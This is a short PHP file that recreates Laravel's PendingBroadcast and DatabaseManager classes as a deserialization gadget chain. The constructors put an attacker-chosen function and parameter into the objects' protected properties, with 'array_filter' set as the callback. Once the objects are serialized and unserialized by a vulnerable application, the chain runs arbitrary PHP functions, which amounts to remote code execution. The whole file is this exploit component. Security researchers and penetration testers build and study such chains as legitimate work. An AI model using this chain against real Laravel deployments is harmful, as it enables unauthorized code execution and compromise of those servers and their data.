<?php

namespace Illuminate\Broadcasting {
    class PendingBroadcast
    {
        protected $events;

        function __construct($function, $paramter)
        {
            $this->events = new \Illuminate\Database\DatabaseManager($function, $paramter);
        }
    }
}

namespace Illuminate\Database {
    class DatabaseManager
    {
        protected $app;
        protected $extensions;

        function __construct($function, $paramter)
        {
            $this->app = [
                "config" => [
                    "database.default" => $function,
                    "database.connections" => [
                        $function => array($paramter)
                    ]
                ]
            ];
            $this->extensions[$function] = "array_filter"; //or array_walk
        }
    }
}
